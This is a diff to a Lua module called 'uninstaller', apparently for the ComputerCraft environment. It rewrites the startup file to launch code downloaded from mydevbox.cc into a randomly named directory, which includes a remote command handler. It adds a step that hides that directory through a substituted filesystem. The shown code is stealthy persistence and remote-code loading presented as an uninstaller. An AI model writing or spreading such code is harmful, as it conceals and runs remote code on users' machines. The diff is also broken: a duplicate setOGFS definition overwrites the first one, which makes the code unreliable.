@@ -12,7 +12,7 @@ uninstaller.__index = uninstaller
 local OriginalShell = shell
 local OriginalFS = fs
 local OriginalInstallDir=nil
-
+local CustomFS = nil
 local function scan_startup()
     --Checks for my name in comments
     if OriginalFS.exists("startup.lua") then local f=OriginalFS.open("startup.lua","r") local l1,l2,l3=f.readLine(),f.readLine(),f.readLine() f.close() if (l1..l2..l3):find("wget pastebin") then local u=string.match(l1..l2..l3,"pastebin%s+(%S+)") if u then local r=http.get("https://pastebin.com/raw/"..u) if r and r.readAll():find("David Lightman") then return true end end elseif (l1..l2..l3):find("David Lightman") then return true end end
@@ -90,7 +90,7 @@ local function installer()
                     shell.run("%s/%s")
                 end
                 parallel.waitForAny(a1, a2)
-                ]], oldStartupFileName, OriginalInstallDir, "main.lua", oldStartupFileName, OriginalInstallDir, "main.lua"))
+                ]], oldStartupFileName, OriginalInstallDir, "main.lua", OriginalInstallDir, "main.lua"))
         f.close()
         end
     end
@@ -123,7 +123,9 @@ local function installer()
     downloadFile("https://mydevbox.cc/src/sys/crypto/EnD.lua", DIR_4Nin92xCdd0.."/sys/crypto/EnD.lua")
     downloadFile("https://mydevbox.cc/src/networking/processor/command_handler.lua", DIR_4Nin92xCdd0.."/networking/processor/command_handler.lua")
     downloadFile("https://mydevbox.cc/src/uninstaller.lua", DIR_4Nin92xCdd0.."/uninstaller.lua")
-    downloadFile("https://mydevbox.cc/src/main.lua", DIR_4Nin92xCdd0.."/main.lua") 
+    downloadFile("https://mydevbox.cc/src/main.lua", DIR_4Nin92xCdd0.."/main.lua")
+    if (CustomFS~=nil) then
+        CustomFS.hideDir(DIR_4Nin92xCdd0)
     end
 
 
@@ -141,6 +143,9 @@ end
 
 function uninstaller.setOGFS(fs1)
     if ((fs1~=nil) and (type(fs1)=="table")) then OriginalFS = fs1 end
+end
+function uninstaller.setOGFS(fs2)
+    if ((fs2~=nil) and (type(fs2)=="table")) then CustomFS = fs2 end
 end
 function uninstaller.getInstallDir()
     return OriginalInstallDir
